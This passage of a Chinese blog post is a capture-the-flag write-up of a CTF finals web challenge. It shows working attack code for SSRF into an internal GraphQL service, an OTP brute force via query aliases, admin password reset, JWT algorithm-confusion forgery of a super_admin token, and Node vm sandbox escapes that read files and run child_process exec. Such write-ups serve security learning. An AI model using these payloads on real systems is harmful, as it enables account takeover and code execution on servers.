&#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid expression&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">validateExpression</span>(expression)) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Expression contains disallowed identifiers&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ctx = &#123; <span class="attr">result</span>: <span class="literal">undefined</span>, <span class="title class_">Math</span>, <span class="title class_">JSON</span> &#125;;</span><br><span class="line">    <span class="keyword">const</span> _p = globalThis.<span class="property">process</span>;</span><br><span class="line">    <span class="keyword">const</span> _b = globalThis.<span class="property">Buffer</span>;</span><br><span class="line">    <span class="keyword">delete</span> globalThis.<span class="property">process</span>;</span><br><span class="line">    <span class="keyword">delete</span> globalThis.<span class="property">Buffer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> value;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      vm.<span class="title function_">runInNewContext</span>(</span><br><span class="line">        <span class="string">`result = (() =&gt; &#123; <span class="subst">$&#123;expression&#125;</span> &#125;)()`</span>,</span><br><span class="line">        ctx,</span><br><span class="line">        &#123; <span class="attr">timeout</span>: <span class="number">2000</span> &#125;,</span><br><span class="line">      );</span><br><span class="line">      value = <span class="title class_">String</span>(ctx.<span class="property">result</span> ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      value = <span class="string">`Error: <span class="subst">$&#123;e.message&#125;</span>`</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      globalThis.<span class="property">process</span> = _p;</span><br><span class="line">      globalThis.<span class="property">Buffer</span> = _b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; value &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+<p><strong>链接检查功能</strong>：可用于进行SSRF攻击</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/link-check&#x27;</span>, requireUser, linkCheckLimiter, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> reqBody = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!reqBody || <span class="keyword">typeof</span> reqBody !== <span class="string">&#x27;object&#x27;</span> || <span class="title class_">Array</span>.<span class="title function_">isArray</span>(reqBody)) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid body&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> &#123; url, <span class="attr">method</span>: methodRaw, <span class="attr">headers</span>: extraHeaders = &#123;&#125;, <span class="attr">body</span>: jsonBody &#125; = reqBody;</span><br><span class="line">    <span class="keyword">if</span> (!url || <span class="keyword">typeof</span> url !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;url is required&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> method = (methodRaw == <span class="literal">null</span> || methodRaw === <span class="string">&#x27;&#x27;</span>) ? <span class="string">&#x27;GET&#x27;</span> : <span class="title class_">String</span>(methodRaw).<span class="title function_">toUpperCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (method === <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">          <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">          <span class="attr">headers</span>: &#123; <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;IntraPortal-LinkCheck/1.0&#x27;</span> &#125;,</span><br><span class="line">          <span class="attr">redirect</span>: <span class="string">&#x27;follow&#x27;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">const</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">status</span>: response.<span class="property">status</span>, <span class="attr">body</span>: text &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ([<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;PUT&#x27;</span>, <span class="string">&#x27;PATCH&#x27;</span>].<span class="title function_">includes</span>(method)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (jsonBody === <span class="literal">undefined</span> || jsonBody === <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;body is required for POST/PUT/PATCH&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> init = &#123;</span><br><span class="line">          method,</span><br><span class="line">          <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, ...extraHeaders &#125;,</span><br><span class="line">          <span class="attr">body</span>: <span class="keyword">typeof</span> jsonBody === <span class="string">&#x27;string&#x27;</span> ? jsonBody : <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(jsonBody),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, init);</span><br><span class="line">        <span class="keyword">const</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">status</span>: response.<span class="property">status</span>, <span class="attr">body</span>: text &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Unsupported method&#x27;</span> &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="title class_">String</span>(e.<span class="property">message</span>) &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>需要登录</strong>才能使用</li>
+<li>限流：每分钟20次</li>
+<li>可发起 HTTP 请求并返回响应内容</li>
+</ul>
+<h3 id="解题思路"><a class="markdownIt-Anchor" href="#解题思路"></a> 解题思路</h3>
+<p>思路还是很清晰的：<strong>通过/api/link-check 打ssrf 通过 graphql接口提权到super_admin 然后打vm 沙箱逃逸</strong></p>
+<p>完整解题线路是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">普通用户</span><br><span class="line">  ↓</span><br><span class="line">利用 /api/link-check 让服务器请求自己的 /graphql</span><br><span class="line">  ↓</span><br><span class="line">通过 GraphQL 重置 admin 密码</span><br><span class="line">  ↓</span><br><span class="line">登录 admin，读出 JWT 公钥</span><br><span class="line">  ↓</span><br><span class="line">利用 JWT alg confusion 伪造 super_admin</span><br><span class="line">  ↓</span><br><span class="line">访问 /admin/super/evaluate</span><br><span class="line">  ↓</span><br><span class="line">利用 vm 沙箱逃逸读取 flag</span><br></pre></td></tr></table></figure>
+<h3 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h3>
+<p>参考<a target="_blank" rel="noopener" href="https://cnup.top/2026/05/03/CCB2026%E5%86%B3%E8%B5%9BWEB-WP/#QLwist">CCB2026决赛WEB-WP | lzz0403’s blog</a></p>
+<p><img src="CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428161714730.png" alt="image-20260428161714730" /></p>
+<p>多处有graphql的身影，虽然是内网才能访问但是可以打ssrf</p>
+<p>这里还禁用了内省查询，可以使用get进行绕过，这里代码只对body进行了限制，但是结果是有CSRF限制，get请求不可用</p>
+<blockquote>
+<p>内省就是：</p>
+<blockquote>
+<p>我可以问 GraphQL 服务：你有哪些类型？有哪些 Query？有哪些 Mutation？每个接口需要什么参数？</p>
+</blockquote>
+<p>正常情况下，攻击者拿到 GraphQL 入口后，会先问：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  __schema &#123;</span><br><span class="line">    types &#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但这题写了过滤：禁了 <code>__schema</code></p>
+</blockquote>
+<p><img src="CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260508150300727.png" alt="image-20260508150300727" /></p>
+<p><img src="CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428162223921.png" alt="image-20260428162223921" /></p>
+<p>这里用<code>__type</code>绕过</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">请告诉我 Mutation 类型里有哪些字段，每个字段有哪些参数。</span></span><br><span class="line">query &#123; __type(name: \&quot;Mutation\&quot;) &#123; fields &#123; name args &#123; name&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428164516696.png" alt="image-20260428164516696" /></p>
+<p>得到有resetPassword、resetToken、verifyOTP等，也就是说 GraphQL 里有密码重置功能</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="number">200</span><span class="punctuation">,</span><span class="attr">&quot;body&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;\&quot;data\&quot;:&#123;\&quot;__type\&quot;:&#123;\&quot;fields\&quot;:[&#123;\&quot;name\&quot;:\&quot;register\&quot;,\&quot;args\&quot;:[&#123;\&quot;name\&quot;:\&quot;username\&quot;&#125;,&#123;\&quot;name\&quot;:\&quot;password\&quot;&#125;]&#125;,&#123;\&quot;name\&quot;:\&quot;login\&quot;,\&quot;args\&quot;:[&#123;\&quot;name\&quot;:\&quot;username\&quot;&#125;,&#123;\&quot;name\&quot;:\&quot;password\&quot;&#125;]&#125;,&#123;\&quot;name\&quot;:\&quot;requestPasswordReset\&quot;,\&quot;args\&quot;:[&#123;\&quot;name\&quot;:\&quot;username\&quot;&#125;]&#125;,&#123;\&quot;name\&quot;:\&quot;verifyOTP\&quot;,\&quot;args\&quot;:[&#123;\&quot;name\&quot;:\&quot;username\&quot;&#125;,&#123;\&quot;name\&quot;:\&quot;otp\&quot;&#125;]&#125;,&#123;\&quot;name\&quot;:\&quot;resetPassword\&quot;,\&quot;args\&quot;:[&#123;\&quot;name\&quot;:\&quot;resetToken\&quot;&#125;,&#123;\&quot;name\&quot;:\&quot;newPassword\&quot;&#125;]&#125;]&#125;&#125;&#125;\n&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><code>resetpassword</code>需要<code>resetToken</code>和<code>newPassword</code></p>
+<p>则我们可能需要爆破一下opt拿到token，<strong>alias别名绕过limit限制</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">            otp = <span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span>&quot;</span></span><br><span class="line">            fields.append(</span><br><span class="line">                <span class="string">f&#x27;o<span class="subst">&#123;i&#125;</span>: verifyOTP(username:&quot;admin&quot;, otp:&quot;<span class="subst">&#123;otp&#125;</span>&quot;)&#x27;</span></span><br><span class="line">                <span class="string">&quot;&#123; resetToken &#125;&quot;</span></span><br><span class="line">            )</span><br><span class="line">        result = <span class="variable language_">self</span>.graphql_raw(user_token, <span class="string">&quot;OTP &#123; &quot;</span> + <span class="string">&quot; &quot;</span>.join(fields) + <span class="string">&quot; &#125;&quot;</span>)</span><br><span class="line">        data = result.get(<span class="string">&quot;data&quot;</span>) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> alias, value <span class="keyword">in</span> data.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>) <span class="keyword">and</span> value.get(<span class="string">&quot;resetToken&quot;</span>):</span><br><span class="line">                otp = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(alias[<span class="number">1</span>:]):04d&#125;</span>&quot;</span></span><br><span class="line">                reset_token = value[<span class="string">&quot;resetToken&quot;</span>]</span><br><span class="line">                <span class="variable language_">self</span>.log(<span class="string">f&quot;found admin OTP=<span class="subst">&#123;otp&#125;</span>, resetToken=<span class="subst">&#123;reset_token&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> reset_token</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line"><span class="comment">#[*] found admin OTP=7569, resetToken=b08b3af403b27bed185f2dc9e8f404e74e4d436a327a7f07</span></span><br></pre></td></tr></table></figure>
+<p><img src="CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428164838033.png" alt="image-20260428164838033" /></p>
+<p><img src="CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428170333422.png" alt="image-20260428170333422" /></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mutation <span class="punctuation">&#123;</span> resetPassword(resetToken<span class="punctuation">:</span>\<span class="string">&quot;b08b3af403b27bed185f2dc9e8f404e74e4d436a327a7f07\&quot;,newPassword:\&quot;admin\&quot;) &#125;</span></span><br></pre></td></tr></table></figure>
+<p>成功修改密码</p>
+<p>然后登录admin，拿到cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzc3MzY3MTA3LCJleHAiOjE3NzczOTU5MDd9.TvPIqYExWRth1Ity1JUWFLX_djhAJ08v9BgFz0kwTniLpy8P-yXjCDEmJ-CqumA5oNpZ6TqK2Piu8eMts2cHqXOUei4vAta3WyX0TmIpUv3b_H_UlJFAWoCnDlrtyJil0_qsTQgXVjmr4pvXP_RKCA8fYH2tcWMMl9er7mo_dVTAeNGfDmVBewaSLKIS7NZqTvemXLPlJTy9iUhYk0VMqcwov56hAEFSOfYh7SRYFibd4c0mPSxfo5NvN9jNkBl0ct0reQ7WTFla-36MfLqzdYPx_hfAqevybZVSr9K2jbLRZjTZc_MsF61mynlZY9d7_kiOaQ4sEnVp1Ahn1USCKg</span><br></pre></td></tr></table></figure>
+<p>GraphQL中有隐藏字段：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  _pkA  # RSA公钥片段1</span><br><span class="line">  _pkB  # RSA公钥片段2  </span><br><span class="line">  _pkC  # RSA公钥片段3</span><br><span class="line">  _pkD  # RSA公钥片段4</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>有了admin我们就可以读取<code>_pkA/_pkB/_pkC/_pkD</code>（前面绕过读取可以读出来但是没办法读取内容需要admin） 得到rsa密钥拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query &#123; _pkA _pkB _pkC _pkD &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428170349273.png" alt="image-20260428170349273" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:200,&quot;body&quot;:&quot;&#123;\&quot;data\&quot;:&#123;\&quot;_pkA\&quot;:\&quot;MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApHvT3IloJV43Jloe2p0iDv9BTRpgwQsKfrH3D21XhCrgANkt2D3yds\&quot;,\&quot;_pkB\&quot;:\&quot;rnPJaU9x+enBc7Z9qoFMs7Br1UUT9U6pYMiCpMBVWyTKZJhllS73ciccV0sGy8bA1OzvvvURuZiRJNuZ2bhMIO3HmvNxxHNnFz\&quot;,\&quot;_pkC\&quot;:\&quot;i7Z1Fee6sKs2d6f2hSohihA0OYML8mSgGU6fv1bPX84rRV1GtmvtKHz5SYBJdepOs/YXkL2vrxDBixN1kCssrcjiJu5XiNi3EO\&quot;,\&quot;_pkD\&quot;:\&quot;A9GcpP1STbNDccCDxuH/cvPXfqucrAaAyR0VjCx1aQyPQw7knAWosZopRCnhxmwIB9DxcSz54eZFXx3ymK7vhbgL4gOwIDAQAB\&quot;&#125;&#125;\n&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApHvT3IloJV43Jloe2p0iDv9BTRpgwQsKfrH3D21XhCrgANkt2D3ydsrnPJaU9x+enBc7Z9qoFMs7Br1UUT9U6pYMiCpMBVWyTKZJhllS73ciccV0sGy8bA1OzvvvURuZiRJNuZ2bhMIO3HmvNxxHNnFzi7Z1Fee6sKs2d6f2hSohihA0OYML8mSgGU6fv1bPX84rRV1GtmvtKHz5SYBJdepOs/YXkL2vrxDBixN1kCssrcjiJu5XiNi3EOA9GcpP1STbNDccCDxuH/cvPXfqucrAaAyR0VjCx1aQyPQw7knAWosZopRCnhxmwIB9DxcSz54eZFXx3ymK7vhbgL4gOwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<p>打JWT alg confusion</p>
+<p>服务端本来是 <code>alg=RS256</code>，并用 RSA 公钥验签。我们把header 改成 <code>alg=HS256</code>，服务端依然用“公钥”去验签，但在HS256下，它就变成了HMAC secret。用HS256计算签名，于是可以伪造super_admin token</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;super_admin&quot;,</span><br><span class="line">  &quot;iat&quot;: &lt;now&gt;,</span><br><span class="line">  &quot;exp&quot;: &lt;now + 8h&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="沙箱逃逸"><a class="markdownIt-Anchor" href="#沙箱逃逸"></a> 沙箱逃逸</h4>
+<h5 id="异步特性"><a class="markdownIt-Anchor" href="#异步特性"></a> 异步特性</h5>
+<p>然后最后就是要绕<code>/admin/super/evaluate</code>，过滤了<code>process/require</code>等黑名单，并临时<code>delete globalThis.process</code>。但 <code>vm.runInNewContext </code>返回后 finally 会恢复 process。</p>
+<p>也就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行前删掉 process</span><br><span class="line">执行后恢复 process</span><br></pre></td></tr></table></figure>
+<p>但我们可以先在沙箱里注册<code>Promise.resolve().then(…)</code>，等finally恢复process后异步执行，通过 getBuiltinModule(‘fs’) 读文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. vm.runInNewContext 开始执行</span><br><span class="line">2. 你的代码注册 Promise.then 回调</span><br><span class="line">3. 你的代码立即返回 &quot;scheduled&quot;</span><br><span class="line">4. vm.runInNewContext 结束</span><br><span class="line">5. finally 执行，恢复 globalThis.process</span><br><span class="line">6. Promise.then 回调开始执行</span><br><span class="line">7. 此时 process 已经恢复</span><br><span class="line">8. 回调里读取文件，把结果写到全局变量 leak</span><br><span class="line">9. 再请求 evaluate，读出 leak</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">schedule = (</span><br><span class="line">            <span class="string">&quot;Promise.resolve().then(()=&gt;&#123;try&#123;&quot;</span></span><br><span class="line">            <span class="string">&quot;const p=this.constructor.constructor(&#x27;return pro&#x27;+&#x27;cess&#x27;)();&quot;</span></span><br><span class="line">            <span class="string">&quot;const fs=p.getBuiltinModule(&#x27;fs&#x27;);&quot;</span></span><br><span class="line">            + js_body</span><br><span class="line">            + <span class="string">&quot;&#125;catch(e)&#123;this.constructor.constructor(&#x27;return this&#x27;)().leak=&#x27;ERR:&#x27;+e.message&#125;&#125;);&quot;</span></span><br><span class="line">            <span class="string">&quot; return &#x27;scheduled&#x27;&quot;</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
+<p>然后就是list或者read一下文件就可以了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">js = (</span><br><span class="line">    <span class="string">&quot;this.constructor.constructor(&#x27;return this&#x27;)().leak=&quot;</span></span><br><span class="line">    f<span class="string">&quot;fs.readFileSync(&#123;json.dumps(path)&#125;,&#x27;utf8&#x27;)&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">js = (</span><br><span class="line">    <span class="string">&quot;this.constructor.constructor(&#x27;return this&#x27;)().leak=&quot;</span></span><br><span class="line">    f<span class="string">&quot;fs.readdirSync(&#123;json.dumps(path)&#125;).join(&#x27;\\n&#x27;)&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>最后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] path: /f14g_2c2fffce85ace4eb649d</span><br><span class="line">flag&#123;1jn8uu3mgemq6p4sob2bmmmjabs2qj8j&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="时序绕过"><a class="markdownIt-Anchor" href="#时序绕过"></a> 时序绕过</h5>
+<p>和异步差不多</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在沙箱中执行的代码</span></span><br><span class="line"><span class="keyword">const</span> F = <span class="title class_">Math</span>.<span class="property">constructor</span>.<span class="property">constructor</span>;  <span class="comment">// 获取 Function 构造器</span></span><br><span class="line"><span class="keyword">const</span> G = <span class="title function_">F</span>(<span class="string">&#x27;return this&#x27;</span>)();            <span class="comment">// 获取全局对象</span></span><br><span class="line"><span class="keyword">const</span> C = <span class="title class_">String</span>.<span class="property">fromCharCode</span>;</span><br><span class="line"><span class="keyword">const</span> P = <span class="title function_">C</span>(<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>);   <span class="comment">// &#x27;process&#x27;</span></span><br><span class="line"><span class="keyword">const</span> R = <span class="title function_">C</span>(<span class="number">114</span>,<span class="number">101</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">101</span>); <span class="comment">// &#x27;require&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CP</span> = <span class="title function_">C</span>(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>) + P;   <span class="comment">// &#x27;child_process&#x27;</span></span><br><span class="line"><span class="keyword">const</span> X = <span class="title function_">C</span>(<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">99</span>);               <span class="comment">// &#x27;exec&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 关键：延迟执行</span></span><br><span class="line">G.<span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> p = g[P];      <span class="comment">// 获取 process</span></span><br><span class="line">    <span class="keyword">const</span> cp = p.<span class="property">mainModule</span>[R](<span class="variable constant_">CP</span>);  <span class="comment">// require(&#x27;child_process&#x27;)</span></span><br><span class="line">    cp[X](<span class="string">&#x27;calc&#x27;</span>);       <span class="comment">// 执行 calc.exe</span></span><br><span class="line">&#125;, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;114514&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="javaunboundcc链scriptenginemanager代码执行bcel字节码内存马"><a class="markdownIt-Anchor" href="#javaunboundcc链scriptenginemanager代码执行bcel字节码内存马"></a> JavaUnbound(CC链+ScriptEngineManager代码执行/BCEL字节码+内存马)</h2>
+<p>看java随记</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/126839103p0master1200.jpg" data-sizes="auto" alt="ZeroGCTF2026" class="lazyload">
+          
+        
